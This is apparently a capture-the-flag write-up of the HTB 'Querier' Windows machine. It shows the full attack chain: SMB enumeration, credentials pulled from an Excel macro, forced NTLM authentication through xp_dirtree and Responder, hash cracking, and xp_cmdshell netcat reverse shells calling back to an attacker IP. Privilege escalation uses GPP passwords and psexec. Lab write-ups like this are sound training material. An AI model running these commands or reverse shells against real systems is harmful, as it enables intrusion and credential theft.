<h2 id="1-reconnaissance">1. Reconnaissance</h2>
<h3 id="1-1-why-do-we-start-with-nmap">1.1 Why do we start with Nmap?</h3>
<p>Before attacking any machine, we need to know what services are running, what ports are open, and what the operating system is. Nmap is the standard tool for network discovery and port scanning. We run two scans: a quick full port scan to find all open ports, and an aggressive scan on the interesting ports to get version information and run default scripts.</p>
<h3 id="1-2-commands-run">1.2 Commands Run</h3>
<p><strong>Full port scan (fast):</strong></p>
<pre><code class="language-bash" data-language="bash">sudo nmap -p- -T4 10.129.35.228
</code></pre>
<p><strong>Aggressive scan on discovered ports:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo nmap -p 135,139,445,1433,5985,47001 -sC -sV -A -T4 10.129.35.228 -oN querier_nmap.txt
</code></pre>
<h3 id="1-3-results-and-analysis">1.3 Results &amp; Analysis</h3>
<pre><code>PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 RTM
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</code></pre>
<p><strong>Key findings:</strong></p>
<ul>
<li><strong>Port 445 (SMB):</strong> File sharing is enabled. The scan also revealed: <code>Message signing enabled but not required</code>. This is <strong>critical</strong> because it means we can perform NTLM relay/hash capture attacks later. If signing were required, captured hashes couldn't be relayed.</li>
<li><strong>Port 1433 (MSSQL):</strong> Microsoft SQL Server 2017 is running. This is our primary attack vector.</li>
<li><strong>Ports 5985/47001 (WinRM):</strong> Windows Remote Management is available. Could be useful later for remote access if we get credentials.</li>
<li><strong>Hostname:</strong> <code>QUERIER.HTB.LOCAL</code></li>
</ul>
<h3 id="1-4-adding-to-etc-hosts">1.4 Adding to /etc/hosts</h3>
<p>Because Windows authentication often relies on hostname resolution, we add the target to our hosts file:</p>
<pre><code class="language-bash" data-language="bash">echo "10.129.35.228 querier.htb.local" | sudo tee -a /etc/hosts
</code></pre>

<h2 id="2-smb-enumeration">2. SMB Enumeration</h2>
<h3 id="2-1-why-check-smb-first">2.1 Why check SMB first?</h3>
<p>SMB (Server Message Block) is a common Windows file sharing protocol. Anonymous or null sessions often allow listing of shares, and sometimes shares contain sensitive files, credentials, or configuration data. It's always worth checking SMB early because it can provide quick wins.</p>
<h3 id="2-2-listing-shares">2.2 Listing Shares</h3>
<pre><code class="language-bash" data-language="bash">smbclient -L 10.129.35.228 -N
</code></pre>
<p>The <code>-N</code> flag means "no password" — we attempt a null session.</p>
<p><strong>Results:</strong></p>
<pre><code>Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Reports         Disk
</code></pre>
<p>The <code>Reports</code> share stands out because it's a custom share (not a default Windows share like ADMIN$ or C$).</p>
<h3 id="2-3-connecting-to-the-reports-share">2.3 Connecting to the Reports Share</h3>
<pre><code class="language-bash" data-language="bash">smbclient \\10.129.35.228\Reports -N
</code></pre>
<p>Inside, we found:</p>
<pre><code>Currency Volume Report.xlsm
</code></pre>
<p>We downloaded it:</p>
<pre><code class="language-smb" data-language="smb">get "Currency Volume Report.xlsm"
</code></pre>
<h3 id="2-4-why-is-an-xlsm-file-suspicious">2.4 Why is an .xlsm file suspicious?</h3>
<p><code>.xlsm</code> stands for "Excel Macro-Enabled Workbook." Macros are scripts (typically written in VBA — Visual Basic for Applications) that can contain logic, including hardcoded credentials, database connection strings, or other sensitive information. Developers often accidentally hardcode credentials in macros.</p>
<hr />
<h2 id="3-extracting-credentials-from-xlsm">3. Extracting Credentials from .xlsm</h2>
<h3 id="3-1-understanding-the-xlsm-file-format">3.1 Understanding the .xlsm File Format</h3>
<p>An <code>.xlsm</code> file is actually a ZIP archive containing XML files, binaries, and other resources. The macro code itself is stored in a binary file called <code>vbaProject.bin</code> inside the archive.</p>
<h3 id="3-2-extracting-the-archive">3.2 Extracting the Archive</h3>
<pre><code class="language-bash" data-language="bash">unzip "Currency Volume Report.xlsm" -d xlsm_extracted
</code></pre>
<p>This creates a directory <code>xlsm_extracted/</code> with the following structure:</p>
<pre><code>xlsm_extracted/
├── [Content_Types].xml
├── _rels/
├── docProps/
└── xl/
    ├── vbaProject.bin    &lt;-- This contains the macro code
    ├── workbook.xml
    ├── worksheets/
    └── ...
</code></pre>
<h3 id="3-3-searching-for-credentials">3.3 Searching for Credentials</h3>
<p>We use the <code>strings</code> command to extract human-readable text from the binary macro file, then grep for credential-related keywords:</p>
<pre><code class="language-bash" data-language="bash">strings xlsm_extracted/xl/vbaProject.bin | grep -i -E "uid|pwd|password|user|server"
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=REDACTED
</code></pre>
<h3 id="3-4-what-did-we-find">3.4 What did we find?</h3>
<p>This is a <strong>database connection string</strong> hardcoded directly into the Excel macro. It contains:</p>
<ul>
<li><strong>Username:</strong> <code>reporting</code></li>
<li><strong>Password:</strong> REDACTED</li>
<li><strong>Database:</strong> <code>volume</code></li>
<li><strong>Server:</strong> <code>QUERIER</code></li>
</ul>
<p><strong>Lesson:</strong> Never hardcode credentials in scripts, macros, or source code. They can be extracted with trivial effort.</p>

<h2 id="4-initial-mssql-access">4. Initial MSSQL Access</h2>
<h3 id="4-1-why-use-impacket-mssqlclient">4.1 Why use impacket-mssqlclient?</h3>
<p>MSSQL can be accessed in multiple ways, but <code>impacket-mssqlclient</code> (also known as <code>mssqlclient.py</code>) is one of the most reliable tools from the Impacket suite. It supports Windows authentication (<code>-windows-auth</code>), which is necessary when the SQL server is configured to use Windows accounts rather than SQL-native accounts.</p>
<h3 id="4-2-connecting-to-mssql">4.2 Connecting to MSSQL</h3>
<pre><code class="language-bash" data-language="bash">impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@10.129.35.228 -windows-auth
</code></pre>
<p><strong>Note:</strong> The password contains a <code>$</code> symbol. We wrap the entire <code>user:password</code> combination in quotes so the shell doesn't interpret the <code>$</code> as a variable.</p>
<h3 id="4-3-checking-privileges">4.3 Checking Privileges</h3>
<p>Once connected, we need to know what we can do. In MSSQL, <code>sysadmin</code> is the highest privilege level and allows executing operating system commands via <code>xp_cmdshell</code>.</p>
<pre><code class="language-sql" data-language="sql">SELECT SUSER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT USER_NAME();
</code></pre>
<p><strong>Result:</strong></p>
<ul>
<li>User: <code>QUERIER\reporting</code></li>
<li>Sysadmin: <code>0</code> (FALSE)</li>
</ul>
<p>We're <strong>not</strong> a sysadmin. This means we cannot directly use <code>xp_cmdshell</code> yet. We need to escalate within MSSQL first.</p>
<h3 id="4-4-initial-enumeration-with-xp-dirtree">4.4 Initial Enumeration with xp_dirtree</h3>
<p>Even without sysadmin, MSSQL has built-in "extended stored procedures" that interact with the OS. One of these is <code>xp_dirtree</code>, which lists directory contents.</p>
<pre><code class="language-sql" data-language="sql">EXEC xp_dirtree 'C:\Users', 1, 0;
</code></pre>
<p><strong>Parameters explained:</strong></p>
<ul>
<li><code>'C:\Users'</code> — The directory to list</li>
<li><code>1</code> — Depth (how many levels deep)</li>
<li><code>0</code> — List directories only (1 would include files too)</li>
</ul>
<p>This revealed a user called <code>mssql-svc</code>, which is likely the service account running the SQL Server process. This becomes our next target.</p>
<hr />
<h2 id="5-capturing-the-mssql-svc-ntlm-hash">5. Capturing the mssql-svc NTLM Hash</h2>
<h3 id="5-1-the-core-concept-forced-authentication">5.1 The Core Concept: Forced Authentication</h3>
<p>When we run <code>xp_dirtree</code> and point it at an SMB share on <strong>our</strong> machine (<code>\\10.10.17.27\fake_share\</code>), Windows tries to authenticate to that share using the **current user's credentials** — in this case, the <code>mssql-svc</code> service account. Because SMB signing is <strong>not required</strong> on the target (we saw this in the nmap scan), we can stand up a malicious SMB server that captures the NTLM authentication handshake.</p>
<h3 id="5-2-why-does-this-work">5.2 Why does this work?</h3>
<ul>
<li>The SQL Server service runs as <code>mssql-svc</code></li>
<li>When SQL Server executes <code>xp_dirtree</code> against a remote UNC path, the OS initiates an SMB connection</li>
<li>The OS automatically tries to authenticate as the service account</li>
<li>Our listener captures the NTLMv2 hash</li>
<li>This is essentially a <strong>forced authentication</strong> or <strong>coerced authentication</strong> attack</li>
</ul>
<h3 id="5-3-setting-up-the-listener">5.3 Setting up the Listener</h3>
<p>We use <strong>Responder</strong>, which listens for various authentication protocols (SMB, LLMNR, NBT-NS, etc.) and captures hashes:</p>
<pre><code class="language-bash" data-language="bash">sudo Responder -I tun0
</code></pre>
<p>The <code>-I tun0</code> specifies our VPN interface.</p>
<h3 id="5-4-triggering-the-authentication">5.4 Triggering the Authentication</h3>
<p>Back in the MSSQL shell:</p>
<pre><code class="language-sql" data-language="sql">EXEC xp_dirtree '\\10.10.17.27\fake_share\', 1, 0;
</code></pre>
<p><strong>What happens:</strong></p>
<ol>
<li>The SQL Server process (running as <code>mssql-svc</code>) tries to access <code>\\10.10.17.27\fake_share\</code></li>
<li>Responder responds to the SMB request</li>
<li>The Windows machine sends an NTLMv2 authentication challenge/response</li>
<li>Responder captures the hash</li>
</ol>
<h3 id="5-5-captured-hash">5.5 Captured Hash</h3>
<pre><code>[SMB] NTLMv2-SSP Client   : 10.129.35.228
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:cbeb481c09a37c9b:[redacted retired-lab hash or flag]:...[snip]...
</code></pre>
<p>We saved this to <code>mssql-svc.hash</code>.</p>
<hr />
<h2 id="6-cracking-the-hash">6. Cracking the Hash</h2>
<h3 id="6-1-what-is-an-ntlmv2-hash">6.1 What is an NTLMv2 Hash?</h3>
<p>NTLMv2 is a challenge-response authentication protocol used in Windows. When we capture the hash, we don't get the plaintext password — we get a hash that represents the password encrypted with a nonce (challenge). We can crack this offline by trying many passwords and seeing which one produces the same hash.</p>
<h3 id="6-2-why-use-rockyou-txt">6.2 Why use rockyou.txt?</h3>
<p><code>rockyou.txt</code> is a massive wordlist of real passwords leaked from the RockYou breach. It's the standard starting point for password cracking because it contains the most common passwords people actually use.</p>
<h3 id="6-3-cracking-commands">6.3 Cracking Commands</h3>
<p><strong>With Hashcat:</strong></p>
<pre><code class="language-bash" data-language="bash">hashcat -m 5600 mssql-svc.hash /usr/share/wordlists/rockyou.txt
</code></pre>
<ul>
<li><code>-m 5600</code> specifies the hash mode for NTLMv2</li>
</ul>
<p><strong>With John the Ripper:</strong></p>
<pre><code class="language-bash" data-language="bash">john mssql-svc.hash --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre>
<h3 id="6-4-result">6.4 Result</h3>
<pre><code>mssql-svc::QUERIER:...[snip]...:corporate568
</code></pre>
<p><strong>Password:</strong> REDACTED</p>
<hr />
<h2 id="7-getting-a-shell-as-mssql-svc">7. Getting a Shell as mssql-svc</h2>
<h3 id="7-1-logging-in-as-mssql-svc">7.1 Logging in as mssql-svc</h3>
<pre><code class="language-bash" data-language="bash">impacket-mssqlclient mssql-svc:'corporate568'@10.129.35.228 -windows-auth
</code></pre>
<p>Check privileges again:</p>
<pre><code class="language-sql" data-language="sql">SELECT IS_SRVROLEMEMBER('sysadmin');
</code></pre>
<p><strong>Result:</strong> <code>1</code> (TRUE)</p>
<p>We are now a <strong>sysadmin</strong>! This means we can enable and use <code>xp_cmdshell</code> to execute arbitrary Windows commands.</p>
<h3 id="7-2-enabling-xp-cmdshell">7.2 Enabling xp_cmdshell</h3>
<p><code>xp_cmdshell</code> is a powerful extended stored procedure that spawns a Windows command shell and passes a string for execution. It's disabled by default for security reasons, but as sysadmin we can re-enable it:</p>
<pre><code class="language-sql" data-language="sql">EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
</code></pre>
<p><strong>Explanation:</strong></p>
<ul>
<li><code>sp_configure</code> is used to view or change server configuration options</li>
<li><code>show advanced options</code> must be enabled first before we can modify <code>xp_cmdshell</code></li>
<li><code>RECONFIGURE</code> applies the changes</li>
</ul>
<h3 id="7-3-getting-a-reverse-shell">7.3 Getting a Reverse Shell</h3>
<p><strong>Why a reverse shell?</strong>
<code>xp_cmdshell</code> executes commands but doesn't give us an interactive shell. A reverse shell connects back to our attacker machine, giving us a persistent, interactive command prompt.</p>
<p><strong>Setup:</strong></p>
<ol>
<li><p><strong>Terminal 1:</strong> Start SMB server to host <code>nc.exe</code> (Windows netcat binary)</p>
<pre><code class="language-bash" data-language="bash">sudo python3 smbserver.py -smb2support shared /usr/share/windows-resources/binaries/
</code></pre>
</li>
<li><p><strong>Terminal 2:</strong> Start netcat listener</p>
<pre><code class="language-bash" data-language="bash">nc -lvnp 4444
</code></pre>
</li>
<li><p><strong>MSSQL Shell:</strong> Execute reverse shell</p>
<pre><code class="language-sql" data-language="sql">EXEC xp_cmdshell '\\10.10.17.27\shared\nc.exe -e cmd.exe 10.10.17.27 4444';
</code></pre>
</li>
</ol>
<p><strong>What happens:</strong></p>
<ul>
<li><code>nc.exe</code> is copied from our SMB share and executed on the target</li>
<li><code>-e cmd.exe</code> tells netcat to execute <code>cmd.exe</code> and pipe its input/output through the network connection</li>
<li>The target connects back to our listener on port 4444</li>
<li>We receive an interactive command prompt</li>
</ul>

<h2 id="8-privilege-escalation">8. Privilege Escalation</h2>
<h3 id="8-1-initial-enumeration">8.1 Initial Enumeration</h3>
<p>We check our current privileges:</p>
<pre><code class="language-cmd" data-language="cmd">whoami /priv
</code></pre>
<p>We likely see <code>SeImpersonatePrivilege</code>, which on older Windows versions allows "Potato" attacks. However, on Windows Server 2019, these are often patched. We need another path.</p>
<h3 id="8-2-powerup-ps1-automated-privilege-escalation-checks">8.2 PowerUp.ps1 — Automated Privilege Escalation Checks</h3>
<p><strong>PowerUp.ps1</strong> is part of PowerSploit, a collection of PowerShell modules for penetration testing. It automates the process of checking for common Windows privilege escalation vectors.</p>
<p><strong>Transferring the file:</strong>
We use the same SMB share technique:</p>
<pre><code class="language-cmd" data-language="cmd">copy \\10.10.17.27\shared\PowerUp.ps1 C:\Users\mssql-svc\Documents\
cd C:\Users\mssql-svc\Documents
</code></pre>
<p><strong>Running PowerUp:</strong></p>
<pre><code class="language-powershell" data-language="powershell">powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
</code></pre>
<p>The <code>-ep bypass</code> flag sets the execution policy to bypass, allowing us to run unsigned PowerShell scripts.</p>
<h3 id="8-3-powerup-results">8.3 PowerUp Results</h3>
<p>PowerUp found multiple vulnerabilities:</p>
<h4 id="finding-1-usosvc-service-abuse">Finding 1: UsoSvc Service Abuse</h4>
<pre><code>ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
</code></pre>
<p><strong>What is UsoSvc?</strong>
<code>UsoSvc</code> (Update Orchestrator Service) is a Windows system service that runs as <code>LocalSystem</code>. PowerUp discovered that we have permission to modify this service's configuration. The <code>Invoke-ServiceAbuse</code> function can modify the service to execute arbitrary commands as SYSTEM.</p>
<h4 id="finding-2-group-policy-preferences-gpp">Finding 2: Group Policy Preferences (GPP)</h4>
<pre><code>Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
</code></pre>
<p><strong>What is GPP and why is this a vulnerability?</strong>
Group Policy Preferences allowed administrators to create policies with embedded credentials (e.g., creating local admin accounts across domains). Microsoft encrypted these passwords using AES.</p>
<p><strong>The critical flaw:</strong> Microsoft hardcoded the AES encryption key into every Windows installation, and then <strong>accidentally published this key in public MSDN documentation</strong>. This means anyone can decrypt GPP passwords. The key is publicly available, and tools like PowerUp automatically decrypt it.</p>
<p><strong>Decrypted Administrator Password:</strong> REDACTED</p>
<h3 id="8-4-escalating-to-system">8.4 Escalating to SYSTEM</h3>
<p>We have <strong>two viable paths</strong>. We chose the most direct one.</p>
<h4 id="path-chosen-psexec-py-with-admin-credentials">Path Chosen: psexec.py with Admin Credentials</h4>
<p>Since we already have the plaintext administrator password, we can use <code>psexec.py</code> (another Impacket tool) to remotely execute a service and get a SYSTEM shell:</p>
<pre><code class="language-bash" data-language="bash">impacket-psexec 'administrator:MyUnclesAreMarioAndLuigi!!1!@10.129.35.228'
</code></pre>
<p><strong>How psexec works:</strong></p>
<ol>
<li>Authenticates to the target using SMB with the provided credentials</li>
<li>Uploads a small service executable to the <code>ADMIN$</code> share</li>
<li>Creates and starts a Windows service on the target</li>
<li>The service runs as <code>NT AUTHORITY\SYSTEM</code></li>
<li>Returns an interactive shell</li>
</ol>
<p><strong>Result:</strong></p>
<pre><code class="language-cmd" data-language="cmd">C:\Windows\system32&gt; whoami
nt authority\system
</code></pre>
<h4 id="alternative-path-usosvc-abuse">Alternative Path: UsoSvc Abuse</h4>
<p>If we didn't have the GPP password, we could have abused the <code>UsoSvc</code> service:</p>
<ol>
<li><p>Start a new netcat listener:</p>
<pre><code class="language-bash" data-language="bash">nc -lvp 6666
</code></pre>
</li>
<li><p>In PowerUp:</p>
<pre><code class="language-powershell" data-language="powershell">Invoke-ServiceAbuse -Name 'UsoSvc' -Command "\\10.10.17.27\shared\nc.exe -e cmd.exe 10.10.17.27 6666"
</code></pre>
</li>
</ol>
<p>This modifies the service to execute our netcat reverse shell command, which runs as SYSTEM when the service starts.</p>

<h2 id="9-conclusion-and-key-takeaways">9. Conclusion &amp; Key Takeaways</h2>
<h3 id="attack-chain-summary">Attack Chain Summary</h3>
<ol>
<li><strong>SMB Enumeration</strong> → Found <code>Reports</code> share with macro-enabled Excel file</li>
<li><strong>Credential Harvesting</strong> → Extracted hardcoded MSSQL credentials from macro</li>
<li><strong>MSSQL Access</strong> → Connected as <code>reporting</code> user</li>
<li><strong>Hash Capture</strong> → Used <code>xp_dirtree</code> + Responder to force <code>mssql-svc</code> authentication</li>
<li><strong>Password Cracking</strong> → Cracked NTLMv2 hash offline</li>
<li><strong>Shell Access</strong> → Logged in as <code>mssql-svc</code> (sysadmin), enabled <code>xp_cmdshell</code>, got reverse shell</li>
<li><strong>Privilege Escalation</strong> → PowerUp found GPP password + vulnerable service</li>
<li><strong>SYSTEM Access</strong> → Used <code>psexec.py</code> with decrypted admin password</li>
</ol>
<h3 id="critical-lessons">Critical Lessons</h3>
<ol>
<li><p><strong>Hardcoded Credentials:</strong> The initial foothold came from credentials hardcoded in an Excel macro. Always check scripts, macros, and configuration files for secrets.</p>
</li>
<li><p><strong>SMB Signing:</strong> <code>Message signing enabled but not required</code> allowed us to capture the NTLM hash. In a properly hardened environment, SMB signing should be required.</p>
</li>
<li><p><strong>Forced Authentication:</strong> <code>xp_dirtree</code> and similar MSSQL procedures can trigger outbound SMB connections. Any SQL user can potentially force the service account to authenticate to an attacker-controlled server.</p>
</li>
<li><p><strong>Group Policy Preferences:</strong> GPP is a well-known Windows vulnerability. The encryption key is public, making GPP passwords trivial to decrypt. Always check for <code>Groups.xml</code> and <code>ScheduledTasks.xml</code> in Group Policy directories.</p>
</li>
<li><p><strong>Service Account Isolation:</strong> The <code>mssql-svc</code> account had sysadmin privileges in SQL Server. Service accounts should have the minimum necessary privileges. If <code>reporting</code> had been properly restricted, the hash capture might not have led to a full compromise.</p>
</li>
</ol>
